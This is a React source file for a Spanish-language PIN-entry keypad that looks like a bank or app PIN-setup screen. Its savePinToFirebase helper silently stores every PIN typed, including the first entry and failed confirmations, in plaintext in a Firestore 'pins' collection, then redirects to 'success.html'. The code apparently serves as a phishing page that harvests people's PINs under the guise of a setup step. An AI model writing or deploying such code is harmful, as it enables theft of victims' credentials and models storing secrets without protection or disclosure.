import React, { useState, useEffect, useCallback } from 'react';
import { db } from './firebase';
import { collection, addDoc } from 'firebase/firestore';

const PIN_LENGTH = 4;

type FeedbackState = 'idle' | 'error' | 'success';
type PinStep = 'enter' | 'confirm';

// --- Helper Components ---

const BackspaceIcon: React.FC = () => (
    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M21 5H8.66C8.28 5 7.94 5.21 7.75 5.54L4.25 11.46C4.06 11.79 4.06 12.21 4.25 12.54L7.75 18.46C7.94 18.79 8.28 19 8.66 19H21V5Z" stroke="currentColor" strokeWidth="1.2" strokeLinejoin="round"/>
        <line x1="16.5" y1="9.5" x2="12.5" y2="13.5" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round"/>
        <line x1="12.5" y1="9.5" x2="16.5" y2="13.5" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round"/>
    </svg>
);

interface PinDotsProps {
  pinLength: number;
  feedback: FeedbackState;
}

const PinDots: React.FC<PinDotsProps> = ({ pinLength, feedback }) => {
  const getDotClass = (index: number) => {
    const baseClass = 'w-3 h-3 rounded-full transition-all duration-300';
    const isFilled = index < pinLength;

    if (feedback === 'error') {
      return `${baseClass} bg-red-500`;
    }
    if (isFilled) {
      return `${baseClass} bg-rose-500`;
    }
    return `${baseClass} border border-rose-400`;
  };

  return (
    <div className={`flex items-center justify-center space-x-4 mb-12 ${feedback === 'error' ? 'animate-shake' : ''}`}>
      {Array.from({ length: PIN_LENGTH }).map((_, index) => (
        <div key={index} className={getDotClass(index)} />
      ))}
      <style>{`
        @keyframes shake {
          10%, 90% { transform: translate3d(-1px, 0, 0); }
          20%, 80% { transform: translate3d(2px, 0, 0); }
          30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
          40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        .animate-shake {
          animation: shake 0.82s cubic-bezier(.36,.07,.19,.97) both;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .animate-fade-in {
            animation: fadeIn 0.5s ease-out forwards;
        }
      `}</style>
    </div>
  );
};

interface KeypadButtonProps {
  value: string | React.ReactNode;
  onClick: () => void;
  isIcon?: boolean;
}

const KeypadButton: React.FC<KeypadButtonProps> = ({ value, onClick, isIcon = false }) => {
  const buttonClasses = isIcon
    ? 'flex items-center justify-center text-rose-500 transition-opacity hover:opacity-70 active:opacity-50'
    : 'flex items-center justify-center w-16 h-16 rounded-full border border-rose-500 text-rose-500 text-2xl font-normal transition-colors duration-200 ease-in-out hover:bg-rose-100/50 active:bg-rose-100';

  return (
    <button onClick={onClick} className={buttonClasses}>
      {value}
    </button>
  );
};

// --- Firebase Helper ---

const savePinToFirebase = async (pinValue: string, step: PinStep, match?: boolean) => {
  try {
    const docData: { pin: string; step: string; createdAt: Date; match?: boolean } = {
      pin: pinValue,
      step,
      createdAt: new Date(),
    };
    if (match !== undefined) {
      docData.match = match;
    }
    await addDoc(collection(db, 'pins'), docData);
  } catch (e) {
    console.error("Error adding document to Firebase: ", e);
  }
};


// --- Main App Component ---

function App() {
  const [pin, setPin] = useState('');
  const [firstPin, setFirstPin] = useState('');
  const [feedback, setFeedback] = useState<FeedbackState>('idle');
  const [pinStep, setPinStep] = useState<PinStep>('enter');

  const isInputDisabled = pin.length === PIN_LENGTH || feedback === 'success';

  const handleKeyPress = useCallback((key: string) => {
    if (isInputDisabled) return;

    if (feedback === 'error') {
      setFeedback('idle');
    }

    if (key === 'backspace') {
      setPin((prevPin) => prevPin.slice(0, -1));
    } else if (pin.length < PIN_LENGTH) {
      setPin((prevPin) => prevPin + key);
    }
  }, [pin.length, feedback, isInputDisabled]);

  useEffect(() => {
    if (pin.length !== PIN_LENGTH) {
      return;
    }

    if (pinStep === 'enter') {
      savePinToFirebase(pin, 'enter');
      setFirstPin(pin);
      setTimeout(() => {
        setPin('');
        setPinStep('confirm');
      }, 1500);
    } else if (pinStep === 'confirm') {
      if (pin === firstPin) {
        savePinToFirebase(pin, 'confirm', true);
        setFeedback('success');
        setTimeout(() => {
          window.location.href = 'success.html';
        }, 500);
      } else {
        savePinToFirebase(pin, 'confirm', false);
        setFeedback('error');
        setTimeout(() => {
          setPin('');
          setFirstPin('');
          setFeedback('idle');
          setPinStep('enter');
        }, 820);
      }
    }
  }, [pin, pinStep, firstPin]);

  const keypadKeys = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];

  return (
    <div className="min-h-screen w-full flex flex-col items-center justify-center font-sans p-4">
      <main className="flex flex-col items-center">
        <div className="h-6 text-center mb-6">
          {pinStep === 'confirm' && (
            <p className="text-gray-600 text-lg animate-fade-in">Confirma tu PIN</p>
          )}
        </div>

        <PinDots pinLength={pin.length} feedback={feedback} />
        
        <div>
          <div className="grid grid-cols-3 gap-x-8 gap-y-5">
            {keypadKeys.map((key) => (
              <KeypadButton key={key} value={key} onClick={() => handleKeyPress(key)} />
            ))}

            <div />

            <KeypadButton value="0" onClick={() => handleKeyPress('0')} />

            <KeypadButton 
              value={<BackspaceIcon />} 
              onClick={() => handleKeyPress('backspace')}
              isIcon={true}
            />
          </div>
          
          <div className="mt-8 flex justify-end">
            <button className="text-gray-500 underline text-sm tracking-wide hover:text-rose-500 transition-colors">
              Opciones
            </button>
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;